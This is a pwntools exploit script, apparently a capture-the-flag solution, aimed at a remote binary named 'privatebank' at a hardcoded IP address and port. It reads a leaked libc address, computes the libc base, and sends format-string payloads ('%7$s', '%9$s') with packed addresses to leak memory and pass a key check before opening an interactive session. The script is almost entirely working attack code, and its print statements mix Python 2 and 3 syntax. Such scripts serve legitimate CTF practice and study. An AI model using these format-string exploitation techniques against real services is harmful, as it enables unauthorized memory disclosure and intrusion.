#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 104.197.118.147 --port 10165 ./privatebank
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./privatebank_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '104.197.118.147'
port = int(args.PORT or 10165)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+309
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc-2.34.so")
io.recvuntil("Hint: ")
leak = int(io.recvline()[:-1],16)
libc.address = leak - libc.sym['system']
print (hex(leak))
print (hex(libc.address))

p = '1%7$s'.ljust(5,"\x00")
p += p64(libc.address + 0x218cc0) # 0x218cc0 0x218388
io.sendafter("number: ",p)
io.recvuntil("number: 1")
leak = u64(io.recv(6).ljust(8,"\x00")) + 0x10
print hex(leak)

p = '%9$s'.ljust(8,"\x00")
p += p64(leak)

io.sendafter("Key: ",p)

io.interactive()

